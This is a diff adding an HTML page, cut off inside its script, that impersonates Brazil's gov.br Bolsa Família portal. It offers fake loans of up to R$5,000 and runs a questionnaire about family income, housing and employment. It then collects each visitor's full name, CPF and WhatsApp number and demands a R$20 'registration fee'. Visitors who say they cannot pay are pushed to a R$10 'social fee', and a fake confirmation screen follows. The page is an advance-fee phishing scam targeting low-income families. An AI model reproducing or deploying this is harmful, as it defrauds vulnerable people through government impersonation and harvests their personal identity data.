@@ -1,0 +1,831 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bolsa Família - gov.br</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
+    
+    <style>
+        /* Variáveis de Cores Oficiais */
+        :root {
+            --azul-gov: #1351B4;
+            --azul-escuro: #0C326F;
+            --azul-claro: #E8F0FA;
+            --amarelo-bolsa: #FFCD07;
+            --verde-bolsa: #168821;
+            --vermelho-bolsa: #E60000;
+            --cinza-texto: #333333;
+            --cinza-fundo: #F8F8F8;
+            --branco: #FFFFFF;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        body {
+            background-color: var(--branco);
+            color: var(--cinza-texto);
+            padding-bottom: 80px; 
+        }
+
+        /* --- FAIXA DE DESTAQUE NO TOPO --- */
+        .faixa-destaque-topo {
+            background-color: var(--azul-escuro);
+            color: var(--branco);
+            text-align: center;
+            padding: 15px 15px 20px 15px;
+            position: sticky;
+            top: 0;
+            z-index: 200;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.5);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 6px solid var(--amarelo-bolsa);
+        }
+
+        .faixa-destaque-topo h2 {
+            font-size: 22px;
+            font-weight: 900;
+            color: var(--amarelo-bolsa);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
+            animation: pulsarTexto 1.5s infinite;
+            line-height: 1.2;
+        }
+
+        .destaque-valor {
+            background-color: var(--amarelo-bolsa);
+            color: var(--vermelho-bolsa);
+            padding: 2px 10px;
+            border-radius: 5px;
+            font-size: 26px;
+            display: inline-block;
+            margin: 0 5px;
+            box-shadow: 0 0 15px rgba(255, 205, 7, 0.8);
+            transform: rotate(-2deg);
+        }
+
+        .faixa-destaque-topo p {
+            font-size: 15px;
+            font-weight: 700;
+            background: rgba(255,255,255,0.1);
+            padding: 5px 15px;
+            border-radius: 20px;
+        }
+        
+        .btn-destaque {
+            background-color: var(--verde-bolsa);
+            color: white;
+            border: 3px solid var(--amarelo-bolsa);
+            padding: 15px 40px;
+            border-radius: 30px;
+            font-weight: 900;
+            cursor: pointer;
+            font-size: 18px;
+            transition: 0.2s;
+            box-shadow: 0 0 20px rgba(22, 136, 33, 0.8);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            animation: pulsarBotao 1.5s infinite;
+            margin-top: 5px;
+        }
+        .btn-destaque:hover { background-color: #116b1b; transform: scale(1.1); }
+
+        @keyframes pulsarTexto {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        @keyframes pulsarBotao {
+            0% { transform: scale(1); box-shadow: 0 0 10px rgba(22, 136, 33, 0.6); }
+            50% { transform: scale(1.03); box-shadow: 0 0 25px rgba(22, 136, 33, 1); }
+            100% { transform: scale(1); box-shadow: 0 0 10px rgba(22, 136, 33, 0.6); }
+        }
+
+        /* HEADER */
+        header {
+            border-bottom: 1px solid #ddd;
+            padding: 10px 20px;
+            position: sticky;
+            top: 140px;
+            background: var(--branco);
+            z-index: 100;
+        }
+
+        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
+        .logo-gov { font-size: 28px; font-weight: 900; color: var(--azul-gov); letter-spacing: -1px; }
+        .logo-gov span { color: var(--amarelo-bolsa); }
+        .top-actions { display: flex; gap: 10px; }
+        .btn-outline { border: 2px solid var(--azul-gov); color: var(--azul-gov); background: transparent; padding: 8px 15px; border-radius: 20px; font-weight: bold; cursor: pointer; text-decoration: none; font-size: 14px; }
+        .btn-solid { background: var(--azul-gov); color: var(--branco); border: none; padding: 8px 20px; border-radius: 20px; font-weight: bold; cursor: pointer; font-size: 14px; }
+        .menu-principal { display: flex; justify-content: space-between; align-items: center; font-size: 14px; color: var(--azul-escuro); }
+        .menu-principal .titulo-ministerio { font-weight: 500; max-width: 80%; }
+
+        /* BREADCRUMB */
+        .breadcrumb { padding: 15px 20px; font-size: 13px; color: var(--azul-gov); display: flex; align-items: center; gap: 5px; }
+        .breadcrumb span { color: var(--cinza-texto); }
+
+        /* HERO */
+        .hero { background: linear-gradient(135deg, #0044cc, #002266); color: var(--branco); padding: 30px 20px; text-align: center; position: relative; }
+        .tarja-oferta-hero { background-color: var(--amarelo-bolsa); color: var(--azul-escuro); padding: 10px; font-weight: 900; font-size: 16px; border-radius: 10px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); display: inline-block; transform: rotate(-1deg); }
+        .tarja-oferta-hero span { color: var(--vermelho-bolsa); font-size: 20px; }
+        .hero-logo { font-size: 20px; font-weight: 900; margin-bottom: 20px; }
+        .hero-logo span { color: var(--amarelo-bolsa); }
+        .hero h1 { font-size: 24px; font-weight: 700; line-height: 1.3; max-width: 600px; margin: 0 auto; }
+
+        /* MENU DE NAVEGAÇÃO */
+        .nav-cards { padding: 20px; display: flex; flex-direction: column; gap: 12px; max-width: 800px; margin: 0 auto; }
+        .nav-card-btn { background: var(--branco); border: 1px solid #eee; padding: 15px 20px; border-radius: 15px; font-size: 16px; font-weight: 700; color: var(--azul-escuro); text-align: left; box-shadow: 0 3px 10px rgba(0,0,0,0.08); display: flex; justify-content: space-between; align-items: center; transition: 0.2s; }
+        .nav-card-btn:hover { box-shadow: 0 5px 15px rgba(0,0,0,0.15); transform: translateY(-2px); }
+        .btn-beneficio-card { background-color: var(--verde-bolsa); color: white; border: 2px solid var(--amarelo-bolsa); padding: 12px 20px; border-radius: 20px; font-size: 13px; font-weight: 900; cursor: pointer; white-space: nowrap; transition: 0.2s; box-shadow: 0 4px 10px rgba(22, 136, 33, 0.4); text-transform: uppercase; animation: pulsarBotaoCard 2s infinite; }
+        .btn-beneficio-card:hover { background-color: #116b1b; transform: scale(1.1); }
+        @keyframes pulsarBotaoCard {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        /* TEXTOS E CARDS */
+        .info-text { padding: 20px; max-width: 800px; margin: 0 auto; line-height: 1.6; font-size: 15px; }
+        .info-text h2 { color: var(--azul-gov); font-size: 20px; margin-bottom: 15px; }
+        .timeline-section { text-align: center; padding: 30px 20px; background: var(--branco); }
+        .timeline-section h2 { color: var(--azul-gov); font-size: 20px; margin-bottom: 40px; }
+        .timeline { display: flex; flex-direction: column; align-items: center; position: relative; max-width: 400px; margin: 0 auto; }
+        .timeline::before { content: ''; position: absolute; top: 0; bottom: 0; width: 20px; background-color: var(--amarelo-bolsa); z-index: 1; border-radius: 10px; }
+        .timeline-item { position: relative; z-index: 2; margin-bottom: 30px; display: flex; flex-direction: column; align-items: center; }
+        .circle { width: 100px; height: 100px; border-radius: 50%; display: flex; flex-direction: column; justify-content: center; align-items: center; color: var(--branco); font-weight: bold; border: 8px solid rgba(255,255,255,0.5); box-shadow: 0 4px 10px rgba(0,0,0,0.15); }
+        .circle .ano { font-size: 22px; }
+        .circle .label { font-size: 10px; text-align: center; padding: 0 5px; margin-top: 2px;}
+        .ano-2003 { background-color: #0055CC; }
+        .ano-2014 { background-color: #CC0000; }
+        .ano-2022 { background-color: #FF8800; }
+        .ano-2023 { background-color: #008822; }
+        .ano-2025 { background-color: #777777; }
+
+        .beneficios-section { padding: 30px 20px; background: var(--cinza-fundo); text-align: center; }
+        .beneficios-section h2 { color: var(--azul-gov); margin-bottom: 20px; }
+        .cards-container { display: flex; flex-direction: column; gap: 20px; max-width: 800px; margin: 0 auto; }
+        .beneficio-card { background: var(--branco); border-radius: 15px; padding: 30px 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); position: relative; border-top: 5px solid var(--azul-gov); }
+        .icon-placeholder { width: 50px; height: 50px; background: var(--azul-claro); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 15px auto; font-size: 24px; }
+        .beneficio-card h3 { color: var(--azul-gov); font-size: 18px; margin-bottom: 10px; }
+        .beneficio-card p { font-size: 14px; color: #555; }
+
+        .numeros-section { padding: 40px 20px; text-align: center; }
+        .numeros-section h3 { font-size: 16px; color: var(--azul-gov); margin-bottom: 10px; }
+        .numeros-section .numero-grande { font-size: 48px; font-weight: bold; color: var(--azul-gov); }
+        .numeros-section .numero-label { font-size: 16px; color: var(--azul-gov); margin-bottom: 20px; }
+        .numeros-lista { background: var(--azul-claro); border-radius: 15px; padding: 15px; max-width: 400px; margin: 0 auto; display: flex; flex-direction: column; gap: 10px; }
+        .numero-item { display: flex; justify-content: space-between; padding: 10px; border-bottom: 1px solid rgba(0,0,0,0.05); font-size: 14px; }
+        .numero-item:last-child { border-bottom: none; }
+        .numero-item strong { color: var(--azul-gov); }
+
+        footer { background: var(--azul-escuro); color: var(--branco); padding: 40px 20px; }
+        .footer-logo { font-size: 32px; font-weight: 900; margin-bottom: 30px; }
+        .footer-links { display: flex; flex-direction: column; gap: 15px; }
+        .footer-item { display: flex; justify-content: space-between; align-items: center; padding-bottom: 10px; border-bottom: 1px solid rgba(255,255,255,0.2); font-size: 14px; font-weight: bold; cursor: pointer; }
+
+        .btn-acessibilidade { position: fixed; bottom: 20px; right: 20px; background: #0055CC; color: white; width: 50px; height: 50px; border-radius: 10px; display: flex; justify-content: center; align-items: center; font-size: 24px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); cursor: pointer; z-index: 1000; }
+
+        /* --- MODAL E FUNIL --- */
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 2000; justify-content: center; align-items: center; padding: 20px; }
+        .modal-content { background: var(--branco); border-radius: 15px; padding: 30px 20px; max-width: 450px; width: 100%; text-align: center; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 3px solid var(--azul-gov); max-height: 90vh; overflow-y: auto; }
+        .close-btn { position: absolute; top: 10px; right: 15px; font-size: 24px; font-weight: bold; color: #999; cursor: pointer; background: none; border: none; }
+
+        .progress-container { width: 100%; background-color: #e0e0e0; border-radius: 10px; margin-bottom: 20px; height: 10px; overflow: hidden; }
+        .progress-bar { height: 100%; background-color: var(--verde-bolsa); width: 0%; transition: width 0.4s ease; }
+
+        .step-funnel { display: none; animation: fadeIn 0.4s; }
+        .step-funnel.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .step-funnel h2 { color: var(--azul-gov); font-size: 19px; margin-bottom: 20px; line-height: 1.4; }
+        
+        .btn-option { display: block; width: 100%; background-color: #f8f9fa; border: 2px solid #ccc; color: var(--azul-escuro); padding: 15px; border-radius: 10px; font-size: 15px; font-weight: 500; margin-bottom: 10px; cursor: pointer; transition: 0.2s; text-align: left; }
+        .btn-option:hover { background-color: var(--azul-claro); border-color: var(--azul-gov); transform: translateX(5px); }
+
+        .step-form { display: none; }
+        .step-form h2 { color: var(--azul-gov); font-size: 22px; margin-bottom: 10px; }
+        .step-form p { font-size: 14px; color: #666; margin-bottom: 20px; }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        .input-group label { display: block; font-size: 13px; font-weight: bold; color: var(--azul-escuro); margin-bottom: 5px; }
+        .input-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; }
+        .btn-submit-form { background-color: var(--verde-bolsa); color: white; border: 2px solid var(--amarelo-bolsa); padding: 15px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: 900; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); transition: 0.2s; }
+        .btn-submit-form:disabled { opacity: 0.7; cursor: not-allowed; }
+
+        /* TELA DE PAGAMENTO */
+        .step-payment { display: none; }
+        .step-payment h2 { color: var(--vermelho-bolsa); font-size: 22px; margin-bottom: 10px; }
+        .step-payment .valor-taxa { font-size: 40px; font-weight: 900; color: var(--verde-bolsa); margin: 15px 0; }
+        .step-payment p { font-size: 14px; color: #333; margin-bottom: 20px; line-height: 1.5; }
+        .step-payment .destaque-taxa { font-weight: bold; color: var(--vermelho-bolsa); }
+        .btn-pagamento { background-color: var(--azul-gov); color: white; border: 2px solid var(--amarelo-bolsa); padding: 15px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: 900; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+        .btn-pagamento:disabled { opacity: 0.7; cursor: wait; }
+
+        /* LINK DOWNSELL */
+        .link-downsell {
+            display: block;
+            margin-top: 20px;
+            color: #666;
+            font-size: 14px;
+            text-decoration: underline;
+            cursor: pointer;
+            background: none;
+            border: none;
+            width: 100%;
+            padding: 10px;
+        }
+        .link-downsell:hover { color: var(--vermelho-bolsa); }
+
+        /* TELA DE DOWNSELL (R$ 10) */
+        .step-downsell { display: none; animation: fadeIn 0.5s; }
+        .step-downsell h2 { color: var(--verde-bolsa); font-size: 24px; margin-bottom: 10px; }
+        .step-downsell p { font-size: 15px; color: #333; margin-bottom: 20px; line-height: 1.5; }
+        .step-downsell .valor-taxa { font-size: 40px; font-weight: 900; color: var(--verde-bolsa); margin: 15px 0; text-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+        .step-downsell .destaque-taxa { font-weight: bold; color: var(--vermelho-bolsa); }
+        .btn-downsell { background-color: var(--verde-bolsa); color: white; border: 2px solid var(--amarelo-bolsa); padding: 15px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: 900; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+
+        /* TELA DE VERIFICAÇÃO */
+        .step-verificacao { display: none; animation: fadeIn 0.5s; }
+        .step-verificacao .icon-check {
+            width: 80px; height: 80px;
+            background-color: var(--verde-bolsa);
+            color: white;
+            border-radius: 50%;
+            display: flex; justify-content: center; align-items: center;
+            font-size: 40px;
+            margin: 0 auto 20px auto;
+            box-shadow: 0 0 20px rgba(22, 136, 33, 0.5);
+        }
+        .step-verificacao h2 { color: var(--verde-bolsa); font-size: 24px; margin-bottom: 15px; }
+        .step-verificacao p { font-size: 15px; color: #333; margin-bottom: 15px; line-height: 1.5; }
+        
+        .aviso-tempo {
+            background-color: #fff3cd;
+            border: 1px solid var(--amarelo-bolsa);
+            color: #856404;
+            padding: 15px;
+            border-radius: 10px;
+            font-weight: bold;
+            margin-bottom: 25px;
+            font-size: 15px;
+        }
+
+        .caixa-contato {
+            background-color: var(--azul-claro);
+            border: 2px dashed var(--azul-gov);
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+        }
+        .caixa-contato h3 { color: var(--azul-escuro); font-size: 16px; margin-bottom: 10px; }
+        .caixa-contato .numero-telefone {
+            font-size: 22px;
+            font-weight: 900;
+            color: var(--azul-gov);
+            margin-bottom: 15px;
+            display: block;
+        }
+        .btn-whatsapp {
+            display: inline-block;
+            background-color: #25D366;
+            color: white;
+            text-decoration: none;
+            padding: 12px 25px;
+            border-radius: 30px;
+            font-weight: bold;
+            font-size: 15px;
+            box-shadow: 0 4px 10px rgba(37, 211, 102, 0.4);
+            transition: 0.2s;
+        }
+        .btn-whatsapp:hover { background-color: #1ebe57; transform: scale(1.05); }
+        .step-verificacao .obs { font-size: 12px; color: #777; margin-top: 15px; }
+
+
+        @media (min-width: 768px) {
+            .cards-container { flex-direction: row; flex-wrap: wrap; justify-content: center; }
+            .beneficio-card { width: calc(33.333% - 20px); }
+            .hero h1 { font-size: 32px; }
+            .nav-cards { flex-direction: row; flex-wrap: wrap; justify-content: center;}
+            .nav-card-btn { width: calc(50% - 10px); flex-direction: column; gap: 15px; text-align: center; padding: 25px 15px;}
+            header { top: 120px; }
+            .faixa-destaque-topo h2 { font-size: 26px; }
+            .destaque-valor { font-size: 32px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- FAIXA DE DESTAQUE NO TOPO -->
+    <div class="faixa-destaque-topo">
+        <h2>Bolsa Família com direito a empréstimo de <span class="destaque-valor">até 5 mil</span></h2>
+        <p>Complete seu cadastro e veja se tem direito!</p>
+        <button class="btn-destaque" onclick="abrirCadastro()">Verificar Benefício Agora</button>
+    </div>
+
+    <header>
+        <div class="top-bar">
+            <div class="logo-gov">gov<span>.</span>br</div>
+            <div class="top-actions">
+                <a href="#" class="btn-outline">⣿ Atalhos gov.br</a>
+                <button class="btn-solid">👤 Entrar</button>
+            </div>
+        </div>
+        <div class="menu-principal">
+            <span class="titulo-ministerio">Ministério do Desenvolvimento e Assistência Social, Família e Combate à Fome</span>
+            <span>🔍</span>
+        </div>
+    </header>
+
+    <div class="breadcrumb">
+        🏠 > Ações e Programas > <span>Bolsa Família</span>
+    </div>
+
+    <section class="hero">
+        <div class="tarja-oferta-hero">
+            💰 Empréstimo de <span>até R$ 5.000,00</span> disponível para saque!
+        </div>
+        <div class="hero-logo">PROGRAMA <br><span>BOLSA</span> família</div>
+        <h1>Comida na mesa, vacina no braço e um futuro com novas oportunidades.</h1>
+    </section>
+
+    <section class="nav-cards">
+        <div class="nav-card-btn">
+            <span>Conheça as Regras</span>
+            <button class="btn-beneficio-card" onclick="abrirCadastro()">Verificar Empréstimo</button>
+        </div>
+        <div class="nav-card-btn">
+            <span>Verdade ou Mentira</span>
+            <button class="btn-beneficio-card" onclick="abrirCadastro()">Verificar Empréstimo</button>
+        </div>
+        <div class="nav-card-btn">
+            <span>Pagamentos e Benefícios</span>
+            <button class="btn-beneficio-card" onclick="abrirCadastro()">Verificar Empréstimo</button>
+        </div>
+        <div class="nav-card-btn">
+            <span>Regra de Proteção</span>
+            <button class="btn-beneficio-card" onclick="abrirCadastro()">Verificar Empréstimo</button>
+        </div>
+        <div class="nav-card-btn">
+            <span>Bolsa em Números</span>
+            <button class="btn-beneficio-card" onclick="abrirCadastro()">Verificar Empréstimo</button>
+        </div>
+        <div class="nav-card-btn">
+            <span>Primeira Infância</span>
+            <button class="btn-beneficio-card" onclick="abrirCadastro()">Verificar Empréstimo</button>
+        </div>
+    </section>
+
+    <section class="info-text">
+        <h2>O Bolsa Família, junto com ações de saúde, educação e assistência social, contribui para a garantia de direitos e a melhoria de vida das famílias beneficiárias.</h2>
+        <p>Ao longo desses de 23 anos, muitas histórias foram construídas e transformadas: famílias que conseguiram colocar comida na mesa, manter as vacinas em dia, ver os filhos crescerem, estudarem e conquistarem novas oportunidades. É por você, que faz parte do Bolsa Família, que o Governo Federal segue trabalhando todos os dias, para levar mais segurança, dignidade e melhores condições para a sua família.</p>
+    </section>
+
+    <section class="timeline-section">
+        <h2>Há 23 anos assegurando os direitos de quem mais precisa</h2>
+        <div class="timeline">
+            <div class="timeline-item"><div class="circle ano-2003"><div class="ano">2003</div><div class="label">Lançamento</div></div></div>
+            <div class="timeline-item"><div class="circle ano-2014"><div class="ano">2014</div><div class="label">Saída do Mapa da Fome</div></div></div>
+            <div class="timeline-item"><div class="circle ano-2022"><div class="ano">2022</div><div class="label">Retorno ao Mapa da Fome</div></div></div>
+            <div class="timeline-item"><div class="circle ano-2023"><div class="ano">2023</div><div class="label">Relançamento</div></div></div>
+            <div class="timeline-item"><div class="circle ano-2025"><div class="ano">2025</div><div class="label">Saída do Mapa da Fome da ONU</div></div></div>
+        </div>
+    </section>
+
+    <section class="beneficios-section">
+        <h2>O Bolsa Família garante:</h2>
+        <div class="cards-container">
+            <div class="beneficio-card"><div class="icon-placeholder">🍽️</div><h3>Comida na mesa</h3><p>com dinheiro direto para quem mais precisa.</p></div>
+            <div class="beneficio-card"><div class="icon-placeholder">🤝</div><h3>Mais oportunidades</h3><p>ajudando as famílias a saírem da pobreza e terem acesso a direitos básicos.</p></div>
+            <div class="beneficio-card"><div class="icon-placeholder">👨‍👩‍👧‍👦</div><h3>Proteção para as famílias</h3><p>com atenção especial às crianças, adolescentes, jovens e gestantes.</p></div>
+        </div>
+    </section>
+
+    <section class="numeros-section">
+        <h3>Neste mês</h3>
+        <div class="numero-grande">19,29 milhões</div>
+        <div class="numero-label">de famílias beneficiárias</div>
+        <div class="numeros-lista">
+            <div class="numero-item"><span>BCO</span><strong>17,92 milhões</strong></div>
+            <div class="numero-item"><span>BVG</span><strong>688,80 mil</strong></div>
+            <div class="numero-item"><span>BVC</span><strong>11,42 milhões</strong></div>
+            <div class="numero-item"><span>BRC</span><strong>49,43 milhões</strong></div>
+            <div class="numero-item"><span>BPI</span><strong>8,32 milhões</strong></div>
+        </div>
+    </section>
+
+    <footer>
+        <div class="footer-logo">gov.br</div>
+        <div class="footer-links">
+            <div class="footer-item">NOTÍCIAS E CONTEÚDO <span>▼</span></div>
+            <div class="footer-item">ACESSO À INFORMAÇÃO <span>▼</span></div>
+            <div class="footer-item">AÇÕES E PROGRAMAS <span>▼</span></div>
+            <div class="footer-item">CANAIS DE ATENDIMENTO <span>▼</span></div>
+            <div class="footer-item">SERVIÇOS <span>▼</span></div>
+        </div>
+    </footer>
+
+    <div class="btn-acessibilidade">♿</div>
+
+    <!-- MODAL COM FUNIL, CADASTRO, PAGAMENTO, DOWNSELL E VERIFICAÇÃO -->
+    <div class="modal-overlay" id="modalCadastro">
+        <div class="modal-content">
+            <button class="close-btn" onclick="fecharCadastro()">×</button>
+            
+            <div class="progress-container" id="progressContainer">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+
+            <!-- FUNIL PRINCIPAL: PASSO 1 -->
+            <div class="step-funnel active" id="funnel1">
+                <h2>1. Qual é a sua renda familiar mensal?</h2>
+                <button class="btn-option" onclick="responderFunil('Abaixo de R$ 218', 1)">Abaixo de R$ 218,00</button>
+                <button class="btn-option" onclick="responderFunil('Entre R$ 218 e R$ 500', 1)">Entre R$ 218,00 e R$ 500,00</button>
+                <button class="btn-option" onclick="responderFunil('Acima de R$ 500', 1)">Acima de R$ 500,00</button>
+            </div>
+
+            <!-- FUNIL PRINCIPAL: PASSO 2 -->
+            <div class="step-funnel" id="funnel2">
+                <h2>2. Quantas pessoas moram na sua casa?</h2>
+                <button class="btn-option" onclick="responderFunil('Moro sozinho(a)', 2)">Moro sozinho(a)</button>
+                <button class="btn-option" onclick="responderFunil('2 a 4 pessoas', 2)">2 a 4 pessoas</button>
+                <button class="btn-option" onclick="responderFunil('5 ou mais pessoas', 2)">5 ou mais pessoas</button>
+            </div>
+
+            <!-- FUNIL PRINCIPAL: PASSO 3 -->
+            <div class="step-funnel" id="funnel3">
+                <h2>3. Qual é a sua situação de trabalho atual?</h2>
+                <button class="btn-option" onclick="responderFunil('Desempregado', 3)">Estou desempregado(a)</button>
+                <button class="btn-option" onclick="responderFunil('Trabalho informal', 3)">Trabalho informal / Autônomo</button>
+                <button class="btn-option" onclick="responderFunil('Aposentado/Pensionista', 3)">Aposentado(a) / Pensionista</button>
+            </div>
+
+            <!-- FUNIL PRINCIPAL: PASSO 4 -->
+            <div class="step-funnel" id="funnel4">
+                <h2>4. Você tem filhos menores de 18 anos?</h2>
+                <button class="btn-option" onclick="responderFunil('Sim, 1 filho', 4)">Sim, tenho 1 filho</button>
+                <button class="btn-option" onclick="responderFunil('Sim, 2 ou mais filhos', 4)">Sim, tenho 2 ou mais filhos</button>
+                <button class="btn-option" onclick="responderFunil('Não tenho filhos', 4)">Não tenho filhos</button>
+            </div>
+
+            <!-- FUNIL PRINCIPAL: PASSO 5 -->
+            <div class="step-funnel" id="funnel5">
+                <h2>5. Qual é a situação da sua moradia?</h2>
+                <button class="btn-option" onclick="responderFunil('Alugada', 5)">Casa alugada</button>
+                <button class="btn-option" onclick="responderFunil('Cedida/Invadida', 5)">Cedida / Ocupação</button>
+                <button class="btn-option" onclick="responderFunil('Própria', 5)">Casa própria</button>
+            </div>
+
+            <!-- FUNIL PRINCIPAL: PASSO 6 -->
+            <div class="step-funnel" id="funnel6">
+                <h2>6. Você já está cadastrado no CadÚnico?</h2>
+                <button class="btn-option" onclick="responderFunil('Sim, atualizado', 6)">Sim, meu cadastro está atualizado</button>
+                <button class="btn-option" onclick="responderFunil('Sim, desatualizado', 6)">Sim, mas está desatualizado</button>
+                <button class="btn-option" onclick="responderFunil('Não estou', 6)">Não, ainda não me cadastrei</button>
+            </div>
+
+            <!-- FORMULÁRIO FINAL -->
+            <div class="step-form" id="stepFormulario">
+                <h2>Quase lá! Preencha seus dados</h2>
+                <p>Com base nas suas respostas, você pode ter direito ao empréstimo.</p>
+                
+                <form id="formLead" onsubmit="enviarDados(event)">
+                    <div class="input-group">
+                        <label>Nome Completo</label>
+                        <input type="text" id="nome" placeholder="Digite seu nome" required>
+                    </div>
+                    <div class="input-group">
+                        <label>CPF</label>
+                        <input type="text" id="cpf" placeholder="000.000.000-00" required>
+                    </div>
+                    <div class="input-group">
+                        <label>WhatsApp</label>
+                        <input type="tel" id="whatsapp" placeholder="(00) 00000-0000" required>
+                    </div>
+                    
+                    <button type="submit" class="btn-submit-form" id="btnEnviar">Consultar Empréstimo</button>
+                </form>
+            </div>
+
+            <!-- TELA DE PAGAMENTO (R$ 20) -->
+            <div class="step-payment" id="passoPagamento">
+                <h2>Empréstimo Pré-Aprovado!</h2>
+                <p>Parabéns! Seu perfil foi localizado e você tem direito ao empréstimo de <strong>até R$ 5.000,00</strong>.</p>
+                
+                <div class="valor-taxa">R$ 20,00</div>
+                
+                <p>Para liberar o valor total e agendar o saque, é necessário o pagamento da <span class="destaque-taxa">taxa de inscrição única</span> no valor de R$ 20,00.</p>
+                
+                <button class="btn-pagamento" id="btnPagar" onclick="processarPagamento()">Pagar R$ 20,00 e Liberar Empréstimo</button>
+                
+                <button class="link-downsell" onclick="abrirDownsell()">Não tenho R$ 20,00, mas preciso do benefício.</button>
+            </div>
+
+            <!-- FUNIL DE DOWNSELL (3 PERGUNTAS) -->
+            <div class="step-funnel" id="funnelDown1">
+                <h2>Entendemos. Vamos verificar uma condição especial.</h2>
+                <p style="font-size: 14px; color: #666; margin-bottom: 15px;">1. Você está disposto a fazer uma contribuição simbólica para cobrir os custos do sistema?</p>
+                <button class="btn-option" onclick="responderDownsell(1)">Sim, consigo ajudar com um valor menor.</button>
+                <button class="btn-option" onclick="responderDownsell(1)">Não tenho nenhum valor no momento.</button>
+            </div>
+
+            <div class="step-funnel" id="funnelDown2">
+                <h2>2. Você precisa deste valor com urgência?</h2>
+                <button class="btn-option" onclick="responderDownsell(2)">Sim, é para uma emergência.</button>
+                <button class="btn-option" onclick="responderDownsell(2)">Preciso, mas posso esperar um pouco.</button>
+            </div>
+
+            <div class="step-funnel" id="funnelDown3">
+                <h2>3. Se liberarmos uma taxa reduzida, você consegue pagar hoje?</h2>
+                <button class="btn-option" onclick="responderDownsell(3)">Sim, consigo pagar hoje.</button>
+                <button class="btn-option" onclick="responderDownsell(3)">Vou tentar conseguir o valor.</button>
+            </div>
+
+            <!-- TELA DE OFERTA DOWNSELL (R$ 10) -->
+            <div class="step-downsell" id="passoDownsell">
+                <h2>Condição Especial Liberada!</h2>
+                <p>Como você demonstrou real necessidade, liberamos uma <strong>taxa social reduzida</strong> para o seu caso.</p>
+                
+                <div class="valor-taxa" style="font-size: 20px; text-decoration: line-through; color: #999; margin-bottom: 0;">R$ 20,00</div>
+                <div class="valor-taxa">R$ 10,00</div>
+                
+                <p>Aproveite esta condição única. Pague apenas <span class="destaque-taxa">R$ 10,00</span> para liberar o valor total do seu empréstimo.</p>
+                
+                <button class="btn-downsell" onclick="processarPagamentoDownsell()">Pagar R$ 10,00 e Liberar Empréstimo</button>
+                <p style="font-size: 11px; margin-top: 15px; color: #999;">Oferta válida apenas nesta tela.</p>
+            </div>
+
+            <!-- TELA DE VERIFICAÇÃO FINAL -->
+            <div class="step-verificacao" id="passoVerificacao">
+                <div class="icon-check">✓</div>
+                <h2>Pagamento Confirmado!</h2>
+                <p>Seu cadastro foi recebido com sucesso e agora está em <strong>processo de verificação</strong>.</p>
+                
+                <div class="aviso-tempo">
+                    ⏳ Atenção: Devido à alta demanda, a análise e liberação do empréstimo pode levar <strong>até 3 meses</strong>.
+                </div>
+
+                <div class="caixa-contato">
+                    <h3>Ficou com alguma dúvida?</h3>
+                    <p>Fale com um de nossos colaboradores pelo WhatsApp:</p>
+                    <span class="numero-telefone">(48) 99176-3622</span>
+                    
+                    <a href="https://wa.me/5548991763622?text=Ol%C3%A1!%20Fiz%20o%20pagamento%20do%20empr%C3%A9stimo%20e%20gostaria%20de%20tirar%20uma%20d%C3%BAvida." target="_blank" class="btn-whatsapp">
+                        💬 Falar no WhatsApp
+                    </a>
+                </div>
+
+                <p class="obs">Você pode fechar esta janela. Guarde o número de telefone para futuras consultas.</p>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- SCRIPT DO FRONT-END (FUNIL E LÓGICA) -->
+    <script>
+        const modal = document.getElementById('modalCadastro');
+        const progressBar = document.getElementById('progressBar');
+        const progressContainer = document.getElementById('progressContainer');
+        
+        const stepFormulario = document.getElementById('stepFormulario');
+        const passoPagamento = document.getElementById('passoPagamento');
+        const passoDownsell = document.getElementById('passoDownsell');
+        const passoVerificacao = document.getElementById('passoVerificacao');
+        
+        const btnEnviar = document.getElementById('btnEnviar');
+        const btnPagar = document.getElementById('btnPagar');
+        
+        let respostasFunil = {
+            renda: "",
+            pessoas: "",
+            trabalho: "",
+            filhos: "",
+            moradia: "",
+            cadunico: ""
+        };
+
+        const funisPrincipais = [
+            document.getElementById('funnel1'),
+            document.getElementById('funnel2'),
+            document.getElementById('funnel3'),
+            document.getElementById('funnel4'),
+            document.getElementById('funnel5'),
+            document.getElementById('funnel6')
+        ];
+
+        const funisDownsell = [
